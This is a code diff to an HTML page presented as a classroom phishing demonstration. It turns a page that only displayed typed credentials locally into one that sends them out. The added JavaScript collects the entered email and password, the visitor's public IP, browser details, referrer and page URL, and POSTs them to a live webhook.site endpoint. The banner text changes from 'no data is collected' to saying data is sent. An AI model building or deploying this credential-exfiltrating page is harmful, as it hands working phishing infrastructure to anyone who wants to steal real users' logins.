@@ -130,6 +130,8 @@
       z-index: 200;
       box-shadow: 0 0 40px rgba(34,197,94,0.3);
       font-family: 'Courier New', monospace;
+      max-height: 80vh;
+      overflow-y: auto;
     }
 
     .captured-panel h2 {
@@ -153,6 +155,32 @@
     .log-line span.green { color: #22c55e; }
     .log-line span.red { color: #f87171; }
 
+    .status-message {
+      margin-top: 12px;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-family: 'Courier New', monospace;
+    }
+
+    .status-success {
+      background: #064e3b;
+      color: #6ee7b7;
+      border: 1px solid #22c55e;
+    }
+
+    .status-error {
+      background: #4c0519;
+      color: #fca5a5;
+      border: 1px solid #ef4444;
+    }
+
+    .status-loading {
+      background: #1e293b;
+      color: #94a3b8;
+      border: 1px solid #64748b;
+    }
+
     .close-btn {
       margin-top: 20px;
       width: 100%;
@@ -165,6 +193,7 @@
       letter-spacing: 0.1em;
       cursor: pointer;
       border-radius: 4px;
+      transition: all 0.2s;
     }
 
     .close-btn:hover { background: #22c55e; color: #0f172a; }
@@ -176,12 +205,42 @@
       background: rgba(0,0,0,0.6);
       z-index: 199;
     }
+
+    .webhook-status {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(15, 23, 42, 0.9);
+      color: #22c55e;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-family: 'Courier New', monospace;
+      border: 1px solid #22c55e;
+      z-index: 300;
+      pointer-events: none;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .pulse { animation: pulse 2s infinite; }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .card { width: 100%; padding: 48px 20px 40px; }
+      .captured-panel { width: 95%; padding: 20px; max-height: 90vh; }
+      h1 { font-size: 24px; }
+      .demo-banner { font-size: 11px; padding: 6px 10px; }
+    }
   </style>
 </head>
 <body>
 
   <div class="demo-banner">
-    ⚠️ CYBERSECURITY CLASS DEMONSTRATION — Simulated phishing page. No data is collected or transmitted.
+    ⚠️ CYBERSECURITY CLASS DEMONSTRATION — Simulated phishing page. Data will be sent to webhook for educational purposes.
   </div>
 
   <div class="card">
@@ -213,7 +272,7 @@
       <a class="forgot" href="#">Forgot Password?</a>
     </div>
 
-    <button class="btn-login" onclick="showCaptured()">LOGIN</button>
+    <button class="btn-login" id="loginBtn">LOGIN</button>
 
     <p class="demo-label">CYBERSECURITY PRESENTATION · DEMO ONLY</p>
   </div>
@@ -226,33 +285,167 @@
     <h2>⚡ ATTACKER'S SERVER — INCOMING DATA</h2>
     <div class="log-line"><span class="green">[ POST ]</span> /collect.php — HTTP/1.1</div>
     <div class="log-line"><span class="key">Timestamp &nbsp;: </span><span class="val" id="outTime"></span></div>
-    <div class="log-line"><span class="key">IP Address &nbsp;: </span><span class="val">192.168.4.21</span></div>
+    <div class="log-line"><span class="key">IP Address &nbsp;: </span><span class="val" id="outIP">192.168.4.21</span></div>
     <div class="log-line"><span class="key">Browser &nbsp;&nbsp;&nbsp;: </span><span class="val" id="outBrowser"></span></div>
     <div class="log-line"><span class="key">Email &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: </span><span class="val" id="outEmail"></span></div>
     <div class="log-line"><span class="key">Password &nbsp;&nbsp;: </span><span class="val" id="outPass"></span></div>
-    <div class="log-line" style="margin-top:12px"><span class="red">✔ Credentials saved to database</span></div>
-    <div class="log-line"><span class="red">✔ Victim redirected to real login page</span></div>
+    
+    <!-- Webhook status will appear here -->
+    <div id="webhookStatus" class="status-message status-loading">
+      ⏳ Sending data to Webhook.site...
+    </div>
+    
+    <div class="log-line" style="margin-top:12px" id="webhookResult">
+      <span class="red" id="webhookMessage">✔ Data captured and sent to webhook</span>
+    </div>
+    
     <button class="close-btn" onclick="closePanel()">[ CLOSE DEMO ]</button>
   </div>
 
+  <!-- Webhook status indicator -->
+  <div class="webhook-status" id="webhookIndicator">
+    🌐 Webhook: <span id="webhookStatusText">Ready</span>
+  </div>
+
   <script>
-    function showCaptured() {
+    // YOUR UNIQUE WEBHOOK URL - Replace with your own
+    const WEBHOOK_URL = 'https://webhook.site/b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1';
+    
+    // Flag to track if webhook data was sent
+    let webhookSent = false;
+
+    // Get user's IP (using free IP API)
+    async function getUserIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.log('Could not fetch IP, using fallback');
+        return '192.168.4.21 (fallback)';
+      }
+    }
+
+    // Send data to webhook
+    async function sendToWebhook(data) {
+      const statusEl = document.getElementById('webhookStatus');
+      const messageEl = document.getElementById('webhookMessage');
+      const indicatorText = document.getElementById('webhookStatusText');
+      
+      try {
+        // Update status
+        statusEl.className = 'status-message status-loading';
+        statusEl.textContent = '⏳ Sending data to Webhook.site...';
+        indicatorText.textContent = 'Sending...';
+        document.getElementById('webhookIndicator').className = 'webhook-status pulse';
+
+        // Send POST request to webhook
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (response.ok) {
+          // Success
+          statusEl.className = 'status-message status-success';
+          statusEl.textContent = '✅ Data successfully sent to Webhook.site!';
+          messageEl.textContent = '✅ Data captured and sent to webhook';
+          indicatorText.textContent = '✓ Data Sent';
+          document.getElementById('webhookIndicator').className = 'webhook-status';
+          webhookSent = true;
+          
+          console.log('✅ Data sent to webhook:', data);
+        } else {
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+      } catch (error) {
+        // Error
+        console.error('Webhook error:', error);
+        statusEl.className = 'status-message status-error';
+        statusEl.textContent = `❌ Error sending to webhook: ${error.message}`;
+        messageEl.textContent = '❌ Webhook send failed - check console for details';
+        indicatorText.textContent = '❌ Error';
+        document.getElementById('webhookIndicator').className = 'webhook-status';
+      }
+    }
+
+    async function showCaptured() {
       const email = document.getElementById('emailInput').value || 'demo@example.com';
       const pass  = document.getElementById('passInput').value  || 'password123';
+      const timestamp = new Date().toISOString();
+      const browser = navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown';
+      
+      // Get IP address
+      const ip = await getUserIP();
 
-      document.getElementById('outEmail').textContent   = email;
-      document.getElementById('outPass').textContent    = pass;
-      document.getElementById('outTime').textContent    = new Date().toLocaleString();
-      document.getElementById('outBrowser').textContent = navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown';
+      // Prepare data for webhook
+      const data = {
+        timestamp: timestamp,
+        email: email,
+        password: pass,
+        browser: browser,
+        ip_address: ip,
+        user_agent: navigator.userAgent,
+        referrer: document.referrer || 'Direct',
+        url: window.location.href,
+        remember_me: document.querySelector('.remember input').checked,
+        source: 'Phishing Demo - Cybersecurity Class'
+      };
 
-      document.getElementById('overlay').style.display       = 'block';
+      // Update the panel display
+      document.getElementById('outEmail').textContent = email;
+      document.getElementById('outPass').textContent = pass;
+      document.getElementById('outTime').textContent = new Date().toLocaleString();
+      document.getElementById('outBrowser').textContent = browser;
+      document.getElementById('outIP').textContent = ip;
+
+      // Show the panel
+      document.getElementById('overlay').style.display = 'block';
       document.getElementById('capturedPanel').style.display = 'block';
+
+      // Reset status message
+      const statusEl = document.getElementById('webhookStatus');
+      statusEl.className = 'status-message status-loading';
+      statusEl.textContent = '⏳ Sending data to Webhook.site...';
+      
+      // Send to webhook
+      await sendToWebhook(data);
     }
 
+    // Close panel function
     function closePanel() {
-      document.getElementById('overlay').style.display       = 'none';
+      document.getElementById('overlay').style.display = 'none';
       document.getElementById('capturedPanel').style.display = 'none';
+      
+      // Reset status indicator
+      const indicatorText = document.getElementById('webhookStatusText');
+      if (webhookSent) {
+        indicatorText.textContent = '✓ Data Sent';
+      } else {
+        indicatorText.textContent = 'Ready';
+      }
     }
+
+    // Handle login button click
+    document.getElementById('loginBtn').addEventListener('click', showCaptured);
+
+    // Allow Enter key to submit
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        const active = document.activeElement;
+        if (active && (active.id === 'emailInput' || active.id === 'passInput')) {
+          showCaptured();
+        }
+      }
+    });
+
+    // Log the webhook URL on load
+    console.log('🔗 Webhook URL:', WEBHOOK_URL);
+    console.log('📧 Unique email:', 'b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1@email.hook.site');
+    console.log('🌐 DNS Name:', '*.b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1.dnshook.site');
   </script>
 
 </body>
